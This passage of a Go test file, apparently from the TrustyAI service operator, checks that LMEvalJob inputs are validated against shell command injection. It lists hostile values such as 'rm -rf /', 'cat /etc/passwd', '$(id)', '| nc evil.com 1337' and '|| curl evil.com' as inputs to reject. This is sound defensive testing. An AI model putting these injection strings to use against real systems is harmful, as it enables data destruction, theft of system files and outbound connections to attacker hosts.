package lmes

import (
	"context"
	"encoding/json"
	"fmt"
	"strconv"
	"testing"

	"github.com/stretchr/testify/assert"
	lmesv1alpha1 "github.com/trustyai-explainability/trustyai-service-operator/api/lmes/v1alpha1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/controller-runtime/pkg/log"
)

func Test_CustomCardValidationExtended(t *testing.T) {
	log := log.FromContext(context.Background())
	lmevalRec := LMEvalJobReconciler{
		Namespace: "test",
	}
	var job = &lmesv1alpha1.LMEvalJob{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test",
			Namespace: "default",
			UID:       "for-testing",
		},
		TypeMeta: metav1.TypeMeta{
			Kind:       lmesv1alpha1.KindName,
			APIVersion: lmesv1alpha1.Version,
		},
		Spec: lmesv1alpha1.LMEvalJobSpec{
			Model: "hf",
			ModelArgs: []lmesv1alpha1.Arg{
				{Name: "arg1", Value: "value1"},
			},
			TaskList: lmesv1alpha1.TaskList{
				TaskRecipes: []lmesv1alpha1.TaskRecipe{
					{
						Card: lmesv1alpha1.Card{
							Custom: "invalid JSON",
						},
					},
				},
			},
		},
	}

	assert.ErrorContains(t, lmevalRec.validateCustomRecipes(job, log), "failed to parse the custom card. invalid character 'i' looking for beginning of value")

	// no loader
	job.Spec.TaskList.TaskRecipes[0].Card.Custom = `
		{
			"__type__": "task_card",
			"preprocess_steps": [
				{
					"__type__": "copy",
					"field": "translation/en",
					"to_field": "text"
				},
				{
					"__type__": "copy",
					"field": "translation/de",
					"to_field": "translation"
				},
				{
					"__type__": "set",
					"fields": {
						"source_language": "english",
						"target_language": "dutch"
					}
				}
			],
			"task": "tasks.translation.directed",
			"templates": "templates.translation.directed.all"
		}`
	assert.ErrorContains(t, lmevalRec.validateCustomRecipes(job, log), "failed to parse the custom card. missing loader definition")

	// ok
	job.Spec.TaskList.TaskRecipes[0].Card.Custom = `
		{
			"__type__": "task_card",
			"loader": {
				"__type__": "load_hf",
				"path": "wmt16",
				"name": "de-en"
			},
			"preprocess_steps": [
				{
					"__type__": "copy",
					"field": "translation/en",
					"to_field": "text"
				},
				{
					"__type__": "copy",
					"field": "translation/de",
					"to_field": "translation"
				},
				{
					"__type__": "set",
					"fields": {
						"source_language": "english",
						"target_language": "dutch"
					}
				}
			],
			"task": "tasks.translation.directed",
			"templates": "templates.translation.directed.all"
		}`

	assert.Nil(t, lmevalRec.validateCustomRecipes(job, log))

	job.Spec.TaskList.TaskRecipes[0].Template = &lmesv1alpha1.Template{
		Ref: "tp_0",
	}

	// missing custom template
	assert.ErrorContains(t, lmevalRec.validateCustomRecipes(job, log), "the reference name of the custom template is not defined: tp_0")

	job.Spec.TaskList.CustomArtifacts = &lmesv1alpha1.CustomArtifacts{
		Templates: []lmesv1alpha1.CustomArtifact{
			{
				Name: "tp_0",
				Value: `
					{
						"__type__": "input_output_template",
						"instruction": "In the following task, you translate a {text_type}.",
						"input_format": "Translate this {text_type} from {source_language} to {target_language}: {text}.",
						"target_prefix": "Translation: ",
						"output_format": "{translation}",
						"postprocessors": [
							"processors.lower_case"
						]
					}
				`,
			},
		},
	}

	// pass
	assert.Nil(t, lmevalRec.validateCustomRecipes(job, log))

	job.Spec.TaskList.CustomArtifacts.Templates = append(job.Spec.TaskList.CustomArtifacts.Templates, lmesv1alpha1.CustomArtifact{
		Name: "tp_1",
		Value: `
			{
				"__type__": "input_output_template",
				"instruction": "In the following task, you translate a {text_type}.",
				"input_format": "Translate this {text_type} from {source_language} to {target_language}: {text}.",
				"target_prefix": "Translation: ",
				"postprocessors": [
					"processors.lower_case"
				]
			}
		`,
	})

	job.Spec.TaskList.TaskRecipes[0].Template = &lmesv1alpha1.Template{
		Ref: "tp_1",
	}

	// missing outout_format property
	assert.ErrorContains(t, lmevalRec.validateCustomRecipes(job, log), "failed to parse the custom template: tp_1. missing output_format definition")
}

func Test_ValidateBatchSize(t *testing.T) {
	maxBatchSize := 32
	logger := log.Log.WithName("tests")
	scenarios := []struct {
		provided  string
		validated string
	}{
		{"5", "5"},
		{"auto", "auto"},
		{"auto:3", "auto:3"},
		{"auto:0", "auto:" + strconv.Itoa(maxBatchSize)},
		{"auto:-5", "auto:" + strconv.Itoa(maxBatchSize)},
		{"64", strconv.Itoa(maxBatchSize)},
		{"-5", DefaultBatchSize},
		{"invalid", DefaultBatchSize},
		{"0", DefaultBatchSize},
		{"auto:auto", "auto:" + strconv.Itoa(maxBatchSize)},
	}

	for _, scenario := range scenarios {
		result := validateBatchSize(scenario.provided, maxBatchSize, logger)
		if result != scenario.validated {
			t.Errorf("validateBatchSize(%q) = %q; want %q", scenario.provided, result, scenario.validated)
		}
	}
}

func Test_InputValidation(t *testing.T) {

	// Test cases for ValidateModelName
	t.Run("ValidateModelName", func(t *testing.T) {
		// Valid model names
		validNames := []string{
			"hf",
			"local-completions",
			"local-chat-completions",
			"watsonx_llm",
			"openai-completions",
			"openai-chat-completions",
			"textsynth",
		}

		for _, name := range validNames {
			assert.NoError(t, ValidateModelName(name), "model name must be one of: hf, local-completions, local-chat-completions, watsonx_llm")
		}

		// Invalid model names
		invalidNames := []string{
			"hf2",
			"hf; echo hello > /tmp/pwned",
			"model && rm -rf /",
			"model | cat /etc/passwd",
			"model `whoami`",
			"model $(id)",
			"model & sleep 60",
			"model || curl evil.com",
			"model; shutdown -h now",
			"model\necho something",
			"model'",
			"model\"",
			"model\\",
			"model{test}",
			"model[test]",
			"model<test>",
			"",
		}

		for _, name := range invalidNames {
			assert.Error(t, ValidateModelName(name), "model name must be one of: hf, local-completions, local-chat-completions, watsonx_llm")
		}
	})

	// Test cases for ValidateArgs
	t.Run("ValidateArgs", func(t *testing.T) {
		// Valid arguments
		// Reference keys taken from https://github.com/EleutherAI/lm-evaluation-harness/blob/main/docs/API_guide.md
		validArgs := []lmesv1alpha1.Arg{
			{Name: "pretrained", Value: "model-name"},
			{Name: "device", Value: "cuda"},
			{Name: "batch_size", Value: "16"},
			{Name: "max_length", Value: "2048"},
			{Name: "model", Value: "google/flan-t5-small"},
			{Name: "base_url", Value: "https://vllm-my-model.test.svc.cluster.local"},
			{Name: "tokenizer", Value: "myorg/MyModel-4k-Instruct"},
			{Name: "num_concurrent", Value: "2"},
			{Name: "timeout", Value: "30"},
			{Name: "tokenized_requests", Value: "True"},
			{Name: "tokenizer_backend", Value: "huggingface"},
			{Name: "max_length", Value: "2048"},
			{Name: "max_retries", Value: "3"},
			{Name: "max_gen_toks", Value: "256"},
			{Name: "seed", Value: "1234"},
			{Name: "add_bos_token", Value: "False"},
			{Name: "custom_prefix_token_id", Value: "1234567890"},
			{Name: "verify_certificate", Value: "True"},
		}
		assert.NoError(t, ValidateArgs(validArgs, "test"))

		// Invalid argument names
		invalidArgNames := []lmesv1alpha1.Arg{
			{Name: "name; echo pwned", Value: "value"},
			{Name: "name && rm -rf /", Value: "value"},
			{Name: "name|cat", Value: "value"},
			{Name: "name`whoami`", Value: "value"},
			{Name: "", Value: "value"},
		}

		for _, arg := range invalidArgNames {
			assert.Error(t, ValidateArgs([]lmesv1alpha1.Arg{arg}, "test"), "Should reject invalid arg name: %s", arg.Name)
		}

		// Invalid argument values
		invalidArgValues := []lmesv1alpha1.Arg{
			{Name: "valid", Value: "value; echo pwned"},
			{Name: "valid", Value: "value && rm -rf /"},
			{Name: "valid", Value: "value|cat /etc/passwd"},
			{Name: "valid", Value: "value`whoami`"},
			{Name: "valid", Value: "value$(id)"},
			{Name: "valid", Value: "value\necho something"},
		}

		for _, arg := range invalidArgValues {
			assert.Error(t, ValidateArgs([]lmesv1alpha1.Arg{arg}, "test"), "Should reject invalid arg value: %s", arg.Value)
		}
	})

	// Test cases for ValidateArgValue specifically
	t.Run("ValidateArgValue", func(t *testing.T) {
		// Valid argument values that should pass the pattern
		validValues := []string{
			"simple-value",
			"model_name",
			"123",
			"value123",
			"path/to/model",
			"namespace:value",
			"value.with.dots",
			"value-with-hyphens",
			"value_with_underscores",
			"path/with/slashes",
			"name:space:value",
			"value with spaces",
			"this is a valid text",
			"True",
			"False",
		}

		for _, value := range validValues {
			assert.NoError(t, ValidateArgValue(value), "Should accept valid arg value: %s", value)
		}

		// Invalid argument values that contain characters not in the pattern
		invalidPatternValues := []string{
			"value@domain.com",
			"value#hash",
			"value!exclamation",
			"value*asterisk",
			"value?question",
			"value+plus",
			"value=equals",
			"value%percent",
			"value^caret",
			"value<angle",
			"value>angle",
			"value[bracket]",
			"value{brace}",
		}

		for _, value := range invalidPatternValues {
			assert.Error(t, ValidateArgValue(value), "Should reject arg value with invalid characters: %s", value)
		}

		// Invalid argument values with shell metacharacters
		shellMetaValues := []string{
			"value; echo pwned",
			"value && rm -rf /",
			"value|cat /etc/passwd",
			"value`whoami`",
			"value$(id)",
			"value\necho something",
			"value'single'",
			"value\"double\"",
			"value\\backslash",
		}

		for _, value := range shellMetaValues {
			assert.Error(t, ValidateArgValue(value), "Should reject arg value with shell metacharacters: %s", value)
		}
	})

	// Test cases for ValidateSystemInstruction
	t.Run("ValidateSystemInstruction", func(t *testing.T) {
		// Valid system instructions
		validInstructions := []string{
			"You are a helpful assistant.",
			"Please respond in a professional manner.",
			"Answer questions about machine learning.",
		}

		for _, instruction := range validInstructions {
			assert.NoError(t, ValidateSystemInstruction(instruction), "Should accept valid instruction: %s", instruction)
		}

		// Invalid system instructions
		invalidInstructions := []string{
			"Instruction\"; echo pwned; #",
			"Instruction && rm -rf /",
			"Instruction | cat /etc/passwd",
			"Instruction `whoami`",
			"Instruction $(id)",
			"Instruction\necho something",
			"Instruction || curl evil.com",
		}

		for _, instruction := range invalidInstructions {
			assert.Error(t, ValidateSystemInstruction(instruction), "Should reject invalid instruction: %s", instruction)
		}
	})

	// Test cases for ValidateLimit
	t.Run("ValidateLimit", func(t *testing.T) {
		// Valid limits
		validLimits := []string{
			"100",
			"0.5",
			"0.01",
			"1000",
			"0.9999",
		}

		for _, limit := range validLimits {
			assert.NoError(t, ValidateLimit(limit), "Should accept valid limit: %s", limit)
		}

		// Invalid limits
		invalidLimits := []string{
			"100; echo pwned",
			"0.5 && rm -rf /",
			"limit|cat",
			"100`whoami`",
			"not-a-number",
			"100.5.5",
			"",
		}

		for _, limit := range invalidLimits {
			assert.Error(t, ValidateLimit(limit), "Should reject invalid limit: %s", limit)
		}
	})

	// Test comprehensive validation
	t.Run("ComprehensiveValidation", func(t *testing.T) {
		// Create a job with invalid values in multiple fields
		maliciousJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf; echo pwned > /tmp/compromised",
				ModelArgs: []lmesv1alpha1.Arg{
					{Name: "pretrained", Value: "model; rm -rf /"},
				},
				Limit: "0.5; shutdown -h now",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"task; echo compromised"},
				},
			},
		}

		// Should fail validation
		assert.Error(t, ValidateUserInput(maliciousJob), "Should reject job with invalid patterns")

		// Create a clean job
		cleanJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				ModelArgs: []lmesv1alpha1.Arg{
					{Name: "pretrained", Value: "google/flan-t5-mall"},
					{Name: "device", Value: "cuda"},
				},
				Limit: "0.5",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande", "hellaswag"},
				},
			},
		}

		// Should pass validation
		assert.NoError(t, ValidateUserInput(cleanJob), "Should accept clean job")
	})
}

func Test_CommandSanitization(t *testing.T) {
	// Test comprehensive command sanitization
	t.Run("BlockInvalidInputs", func(t *testing.T) {
		invalidInputs := []struct {
			name        string
			job         *lmesv1alpha1.LMEvalJob
			expectedErr string
		}{
			{
				name: "ModelFieldInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf; echo pwned > /tmp/compromised",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				},
				expectedErr: "invalid model: model name must be one of: hf, local-completions, local-chat-completions, watsonx_llm",
			},
			{
				name: "ModelArgsInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						ModelArgs: []lmesv1alpha1.Arg{
							{Name: "pretrained", Value: "model; rm -rf /"},
						},
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				},
				expectedErr: "invalid model arguments",
			},
			{
				name: "LimitFieldInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						Limit: "0.5; shutdown -h now",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				},
				expectedErr: "invalid limit",
			},
			{
				name: "TaskNameInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande; cat /etc/passwd"},
						},
					},
				},
				expectedErr: "invalid task names",
			},
			{
				name: "TaskNamesInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"arc_easy", "winogrande; cat /etc/passwd"},
						},
					},
				},
				expectedErr: "invalid task names",
			},
			{
				name: "MultipleFieldsInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf && rm -rf /",
						Limit: "0.5 | nc evil.com 1337",
						ModelArgs: []lmesv1alpha1.Arg{
							{Name: "device", Value: "cuda; wget something.com/remote"},
						},
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"task`whoami`"},
						},
					},
				},
				expectedErr: "invalid model: model name must be one of: hf, local-completions, local-chat-completions, watsonx_llm",
			},
		}

		for _, tc := range invalidInputs {
			t.Run(tc.name, func(t *testing.T) {
				err := ValidateUserInput(tc.job)
				assert.Error(t, err, "Should reject invalid input: %s", tc.name)
				assert.Contains(t, err.Error(), tc.expectedErr, "invalid model: model name must be one of: hf, local-completions, local-chat-completions, watsonx_llm")
			})
		}
	})

	t.Run("AcceptSafeInputs", func(t *testing.T) {
		safeInputs := []struct {
			name string
			job  *lmesv1alpha1.LMEvalJob
		}{
			{
				name: "BasicSafeJob",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						ModelArgs: []lmesv1alpha1.Arg{
							{Name: "pretrained", Value: "google/flan-t5-small"},
							{Name: "device", Value: "cuda"},
						},
						Limit: "0.01",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande", "hellaswag"},
						},
					},
				},
			},
			{
				name: "HuggingFaceModel",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"code_eval"},
						},
					},
				},
			},
			{
				name: "OpenAIModel",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "local-completions",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"mmlu"},
						},
					},
				},
			},
			{
				name: "ComplexModelArgs",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						ModelArgs: []lmesv1alpha1.Arg{
							{Name: "pretrained", Value: "google/flan-t5-small"},
							{Name: "device", Value: "cuda:0"},
							{Name: "batch_size", Value: "16"},
							{Name: "max_length", Value: "2048"},
							{Name: "temperature", Value: "0.7"},
						},
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				},
			},
		}

		for _, tc := range safeInputs {
			t.Run(tc.name, func(t *testing.T) {
				err := ValidateUserInput(tc.job)
				assert.NoError(t, err, "Should accept valid input: %s", tc.name)
			})
		}
	})
}

func Test_SafeCommandGeneration(t *testing.T) {
	log := log.FromContext(context.Background())

	t.Run("NoInvalidCharactersInGeneratedArgs", func(t *testing.T) {
		// Create a safe job
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				ModelArgs: []lmesv1alpha1.Arg{
					{Name: "pretrained", Value: "google/flan-t5-small"},
					{Name: "device", Value: "cuda"},
				},
				Limit: "0.5",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande", "hellaswag"},
				},
				LogSamples: func() *bool { b := true; return &b }(),
				NumFewShot: func() *int { i := 5; return &i }(),
			},
		}

		svcOpts := &serviceOptions{
			DefaultBatchSize: "auto",
			MaxBatchSize:     32,
		}

		args := generateArgs(svcOpts, job, log)

		// Verify that the generated args array doesn't use shell
		assert.NotContains(t, args[0], "sh", "Should not use shell")
		assert.NotContains(t, args[0], "-ec", "Should not use shell")

		// Verify that command called is 'python'
		assert.Equal(t, "python", args[0], "Should start with python command")

		// Verify that arguments are properly separated (no concatenated strings)
		modelIndex := -1
		for i, arg := range args {
			if arg == "--model" {
				modelIndex = i
				break
			}
		}
		assert.NotEqual(t, -1, modelIndex, "Should find --model flag")
		assert.Greater(t, len(args), modelIndex+1, "Should have model value after --model flag")
		assert.Equal(t, "hf", args[modelIndex+1], "Model value should be separate argument")

		// Verify no shell metacharacters in any argument
		for i, arg := range args {
			assert.NotContains(t, arg, ";", "Argument %d should not contain semicolon: %s", i, arg)
			assert.NotContains(t, arg, "&&", "Argument %d should not contain &&: %s", i, arg)
			assert.NotContains(t, arg, "||", "Argument %d should not contain ||: %s", i, arg)
			assert.NotContains(t, arg, "|", "Argument %d should not contain pipe: %s", i, arg)
			assert.NotContains(t, arg, "$", "Argument %d should not contain $: %s", i, arg)
			assert.NotContains(t, arg, "`", "Argument %d should not contain backtick: %s", i, arg)
		}

		// Print the generated command for verification
		t.Logf("Generated safe command args: %v", args)
	})

	t.Run("CompareOldVsNewCommandGeneration", func(t *testing.T) {
		// Test that demonstrates the difference between old and new approach
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"task1"},
				},
			},
		}

		svcOpts := &serviceOptions{
			DefaultBatchSize: "auto",
		}

		// Generate new args
		safeArgs := generateArgs(svcOpts, job, log)

		assert.Equal(t, "python", safeArgs[0], "Should start with python")
		assert.Equal(t, "-m", safeArgs[1], "Should have -m flag")
		assert.Equal(t, "lm_eval", safeArgs[2], "Should have lm_eval module")

		// Verify no shell wrapper
		for _, arg := range safeArgs {
			assert.NotEqual(t, "sh", arg, "Should not contain sh")
			assert.NotEqual(t, "-ec", arg, "Should not contain -ec")
		}
	})
}

func Test_EdgeCasesAndBoundaryConditions(t *testing.T) {
	t.Run("EmptyAndNilInputs", func(t *testing.T) {
		// Test nil job
		err := ValidateUserInput(nil)
		assert.Error(t, err, "Should reject nil job")

		// Test empty model
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"task"},
				},
			},
		}
		err = ValidateUserInput(job)
		assert.Error(t, err, "Should reject empty model")

		// Test empty task names
		job.Spec.Model = "valid-model"
		job.Spec.TaskList.TaskNames = []string{""}
		err = ValidateUserInput(job)
		assert.Error(t, err, "Should reject empty task name")
	})

	t.Run("UnicodeAndSpecialCharacters", func(t *testing.T) {
		// Test unicode characters (should _not_ work)
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "model🚀test",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"task"},
				},
			},
		}
		err := ValidateUserInput(job)
		assert.Error(t, err, "Should reject unicode characters")

		// Test URL encoding attempts
		job.Spec.Model = "model%3Becho%20pwned"
		err = ValidateUserInput(job)
		assert.Error(t, err, "Should reject URL encoded invalid characters")
	})

	t.Run("ValidBoundaryValues", func(t *testing.T) {
		// Test valid decimal limits
		validLimits := []string{
			"0",
			"1",
			"0.0",
			"1.0",
			"0.01",
			"0.999",
			"123.456",
			"999",
		}

		for _, limit := range validLimits {
			err := ValidateLimit(limit)
			assert.NoError(t, err, "Should accept valid limit: %s", limit)
		}

		// Test invalid limits
		invalidLimits := []string{
			"abc",
			"1.2.3",
			"1e10",
			"1,5",
			"..",
			"1.",
		}

		for _, limit := range invalidLimits {
			err := ValidateLimit(limit)
			assert.Error(t, err, "Should reject invalid limit: %s", limit)
		}
	})
}

func Test_JSONValues(t *testing.T) {
	t.Run("CardCustomRequiresJSON", func(t *testing.T) {
		// Card.Custom should require JSON
		maliciousJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskRecipes: []lmesv1alpha1.TaskRecipe{
						{
							Card: lmesv1alpha1.Card{
								Name:   "test",
								Custom: "invalid JSON - missing quotes and braces",
							},
						},
					},
				},
			},
		}

		// Should fail validation because Card.Custom requires JSON
		assert.Error(t, ValidateUserInput(maliciousJob), "Should reject Card.Custom with invalid JSON")

		// Valid JSON should pass
		validJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskRecipes: []lmesv1alpha1.TaskRecipe{
						{
							Card: lmesv1alpha1.Card{
								Name:   "test",
								Custom: `{"__type__": "task_card", "loader": {"__type__": "load_hf", "path": "test"}}`,
							},
						},
					},
				},
			},
		}

		// Should pass validation
		assert.NoError(t, ValidateUserInput(validJob), "Should accept Card.Custom with valid JSON")
	})

	t.Run("CustomArtifactValueAcceptsJSONOrPlainText", func(t *testing.T) {
		// CustomArtifact.Value should accept both JSON and plain text

		// Test with plain text
		plainTextJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						SystemPrompts: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "plain_prompt",
								Value: "You are a helpful assistant. Please be accurate and concise.",
							},
						},
					},
				},
			},
		}

		// Should pass (plain text is allowed for CustomArtifact.Value)
		assert.NoError(t, ValidateUserInput(plainTextJob), "Should accept CustomArtifact.Value with plain text")

		// Test with JSON
		jsonJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "json_template",
								Value: `{"__type__": "input_output_template", "instruction": "Translate:", "input_format": "{text}", "output_format": "{translation}"}`,
							},
						},
					},
				},
			},
		}

		// Should pass (JSON is also allowed for CustomArtifact.Value)
		assert.NoError(t, ValidateUserInput(jsonJob), "Should accept CustomArtifact.Value with valid JSON")

		// Test with invalid plain text
		dangerousJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						SystemPrompts: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "dangerous_prompt",
								Value: "You are helpful; rm -rf /",
							},
						},
					},
				},
			},
		}

		// Should fail  (invalid patterns are not allowed even in plain text)
		assert.Error(t, ValidateUserInput(dangerousJob), "Should reject CustomArtifact.Value with dangerous patterns")
	})
}

func Test_CustomArtifactValueValidation(t *testing.T) {
	// Test validation of CustomArtifact.Value for both JSON and plain text cases
	t.Run("TemplateJSONValidation", func(t *testing.T) {
		// Valid JSON template
		validTemplateJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "valid_template",
								Value: `{"__type__": "input_output_template", "instruction": "Translate the following text.", "input_format": "Text: {text}", "output_format": "Translation: {translation}"}`,
							},
						},
					},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(validTemplateJob), "Should accept valid JSON template")

		// JSON with legitimate content (should pass)
		legitimateJSONJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "legitimate_template",
								Value: `{"__type__": "input_output_template", "instruction": "Follow these rules: be helpful; be accurate; be concise.", "input_format": "URL: https://example.com; Text: {text}", "output_format": "Result: {result}"}`,
							},
						},
					},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(legitimateJSONJob), "Should accept JSON with legitimate semicolons in content")

		// Invalid JSON template (malformed)
		invalidJSONJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "invalid_template",
								Value: `{"__type__": "input_output_template", "instruction": "Translate the following text." "input_format": "Text: {text}",`,
							},
						},
					},
				},
			},
		}

		assert.Error(t, ValidateUserInput(invalidJSONJob), "Should reject malformed JSON template")

		// JSON with shell metacharacters in values
		maliciousJSONJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "malicious_template",
								Value: `{"__type__": "input_output_template", "instruction": "Translate; rm -rf /", "input_format": "Text: {text}", "output_format": "Translation: {translation}"}`,
							},
						},
					},
				},
			},
		}

		// Note: This is allowed, since we don't validate the JSON semantic contents, only the structure
		err := ValidateUserInput(maliciousJSONJob)
		t.Logf("Malicious JSON validation result: %v", err)
	})

	t.Run("SystemPromptValidation", func(t *testing.T) {
		// SystemPrompts are validated as JSON (but could be plain text)
		validSystemPromptJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						SystemPrompts: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "valid_prompt",
								Value: `{"__type__": "system_prompt", "prompt": "You are a helpful assistant."}`,
							},
						},
					},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(validSystemPromptJob), "Should accept valid JSON system prompt")

		// Invalid JSON system prompt
		invalidSystemPromptJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						SystemPrompts: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "invalid_prompt",
								Value: `{"__type__": "system_prompt" "prompt": "You are a helpful assistant."`,
							},
						},
					},
				},
			},
		}

		assert.Error(t, ValidateUserInput(invalidSystemPromptJob), "Should reject malformed JSON system prompt")

		// System prompt with invalid content in JSON values
		maliciousSystemPromptJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						SystemPrompts: []lmesv1alpha1.CustomArtifact{
							{
								Name:  "malicious_prompt",
								Value: `{"__type__": "system_prompt", "prompt": "You are a helpful assistant; echo pwned > /tmp/compromised"}`,
							},
						},
					},
				},
			},
		}

		// Note: Allowed, since we just check for structure, not semantic content
		err := ValidateUserInput(maliciousSystemPromptJob)
		t.Logf("Malicious system prompt validation result: %v", err)
	})

	t.Run("PlainTextSystemPromptValidation", func(t *testing.T) {
		plainTextCases := []struct {
			name        string
			value       string
			shouldPass  bool
			description string
		}{
			{
				name:        "valid_plain_text",
				value:       "You are a helpful assistant that provides accurate information.",
				shouldPass:  true,
				description: "Valid plain text system prompt",
			},
			{
				name:        "plain_text_with_newlines",
				value:       "You are a helpful assistant.\nProvide accurate information.\nBe concise.",
				shouldPass:  false,
				description: "Plain text with newlines (rejected by current validation)",
			},
			{
				name:        "plain_text_with_safe_special_chars",
				value:       "You are a helpful assistant! Use proper punctuation, formatting, and grammar.",
				shouldPass:  true,
				description: "Plain text with truly safe special characters",
			},
			{
				name:        "plain_text_with_ampersand",
				value:       "You are a helpful assistant! Use proper punctuation & rm -Rf.",
				shouldPass:  false,
				description: "Plain text with dangerous shell metacharacter (&)",
			},
			{
				name:        "malicious_shell_command",
				value:       "You are helpful; rm -rf /",
				shouldPass:  false,
				description: "Plain text with shell metacharacters",
			},
			{
				name:        "command_injection_attempt",
				value:       "Be helpful `whoami`",
				shouldPass:  false,
				description: "Plain text with command injection attempt",
			},
			{
				name:        "pipe_command",
